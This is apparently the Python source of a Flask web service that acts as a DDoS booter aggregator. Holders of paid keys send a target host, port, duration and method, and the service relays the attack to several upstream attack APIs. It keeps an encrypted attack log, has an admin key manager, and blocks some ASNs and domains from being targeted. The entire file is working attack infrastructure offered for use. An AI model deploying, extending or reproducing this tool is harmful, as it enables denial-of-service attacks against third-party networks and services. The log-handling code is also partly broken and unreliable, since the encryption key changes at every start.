# API Funnel By Arx
# 1. Set your encryption key
# 2. Setup your apis in attacks.yml
# 3. Setup a master key (for checking logs and key manager) in settings.yml
from pystyle import Colors, Colorate, Write, Box
import yaml
import requests
import ipaddress
import time
import json
from urllib.parse import urlparse
from flask import Flask, send_file, request, jsonify, render_template, redirect
from cryptography.fernet import Fernet,InvalidToken
import random
from random import randint

key = Fernet.generate_key() 
fernet = Fernet(key)

with open('attacks.yml', 'r') as f:
    config = yaml.safe_load(f)

with open('settings.yml', 'r') as f:
    settings = yaml.safe_load(f)

blacklisted_domains=settings['config']['blacklist']
apikeys=settings['config']['keys']
maxtime=settings['config']['maxtime']
masterkey=settings['config']['masterkey']
webport=settings['config']['webport']
myip = requests.get("https://ifconfig.me/ip")
myip = myip.content

methods = config['methods']

app = Flask(__name__)

concurrent_attacks = {}
print(Box.DoubleCube(f"Web Server Started On {myip}:{webport}"))
@app.route("/")
def index():
    return "DreamXv v1"

def encwrite(filename, text): # write
    encrypted = fernet.encrypt(text.encode())
    with open(filename, 'ab') as f:
        f.write(encrypted + b'\n')

def encdec(filename): # read
    with open('attacks.log', 'rb') as f:
        encrypted_lines = f.readlines()
    decrypted_lines = []
    for line in encrypted_lines:
        decrypted = fernet.decrypt(line.rstrip()).decode()
        decrypted_lines.append(decrypted)
        #print(decrypted_lines)
    return decrypted_lines

@app.route("/attack")
def attack():
    apisent = 0
    apicount = 0
    host = request.args.get('host')

    is_valid_ip = False
    is_valid_url = False
    try:
        ip = ipaddress.ip_address(host)
        is_valid_ip = True
    except ValueError:
        url = urlparse(host)
        if url.scheme and url.netloc:
            is_valid_url = True

    if not(is_valid_url):
        resp = requests.get(f"https://ipwhois.app/json/{host}")
        dats = json.loads(resp.text)
        asn = dats['asn']
        for asna in blacklisted_domains:
            if asna in asn:
                return jsonify(
                error=True,
                message="This ASN Is Blacklisted."
                ), 451


    if not (is_valid_ip or is_valid_url):
        return jsonify(
            error=True,
            message="Invalid host. Host must be a valid IP address or URL."
        ), 451

    for domain in blacklisted_domains:
        if domain in host:
            return jsonify(
                error=True,
                message="Host is blacklisted."
            ), 451

    key = request.args.get('key')
    port = int(request.args.get('port'))
    duration = int(request.args.get('time'))
    method = request.args.get('method')
    if key not in apikeys:
        return jsonify(
            error=True,
            message="API Key Invalid."
        ), 451
    elif port > 65535:
        return jsonify(
            error=True,
            message="Invalid Port."
        ), 451
    elif duration > maxtime:
        return jsonify(
            error=True,
            message="Max Time Exceeded."
        ), 451
    else:
        if method in methods:
            urls = methods[method]
            
            start_time = time.perf_counter()

            for url in urls:
                apicount += 1
                url = url.replace('<<host>>', host).replace('<<port>>', str(port)).replace('<<time>>', str(duration))
                ua = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
                x = requests.get(url,headers = ua)
                z = x.status_code
                col = "\u001b[42m"
                if z == 200:
                    col = "\u001b[42m"
                    apisent += 1
                else:
                    col = "\u001b[41m"
                print(f"{col}{z}\u001b[0m - {url} - Request sent to API.")
            end_time = time.perf_counter()

            elapsed_time = end_time - start_time
            elapsed_time =str(elapsed_time).split(".",1)[0]
            prefixx = '188'
            genid = result_str = ''.join(random.choice('ABCDE123456789') for i in range(0,6))
            attid = (f"{prefixx}{genid}")
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())
            with open('attacks.log', 'a') as f:
                text = (f"{attid} - {current_time} - {key} - {host}:{port} - {duration}s - {method}\n")
                encwrite('attacks.log', text)
            return jsonify(
                error=False,
                host=host,
                port=port,
                time=duration,
                method=method,
                elapsed=f'{elapsed_time},s',
                success=f'{apisent}/{apicount}',
                attackid=str(attid)
            )

        else:
            return jsonify(
                error=True,
                message="Method Not Found."
            ), 451

@app.route("/admin/keys", methods=['GET', 'POST'])
def manage_keys():
    key1 = request.args.get('auth') 
    if key1 != masterkey:
        return jsonify(
            error=True,
            message="Admin Only Pal."
        ), 403
    if request.method == 'POST':
        key = request.form['key']
        action = request.form['action']

        if action == 'add':
            if key in apikeys:
                return render_template('keys.html', keys=apikeys, error="Key already exists.")
            else:
                apikeys.append(key)
                with open('settings.yml', 'r') as f:
                    settings = yaml.safe_load(f)
                settings['config']['keys'] = apikeys
                with open('settings.yml', 'w') as f:
                    yaml.dump(settings, f)
        elif action == 'delete':
            if key not in apikeys:
                return render_template('keys.html', keys=apikeys, error="Key not found.")
            else:
                apikeys.remove(key)
                with open('settings.yml', 'r') as f:
                    settings = yaml.safe_load(f)
                settings['config']['keys'] = apikeys
                with open('settings.yml', 'w') as f:
                    yaml.dump(settings, f)
    return render_template('keys.html', keys=apikeys)

@app.route('/admin/logs', methods=['GET', 'POST'])
def admin_logs():
    key1 = request.args.get('auth')
    if key1 != masterkey:
        return jsonify(
            error=True,
            message="Admin Only Pal."
        ), 403
    else:

        logs = encdec('attacks.log')
        decrypted_logs = []
        for log in logs:
            decrypted_log = encdec(log)
            decrypted_logs.append(decrypted_log)

        return '<br>'.join(decrypted_log)



app.run(host="0.0.0.0",port=webport)
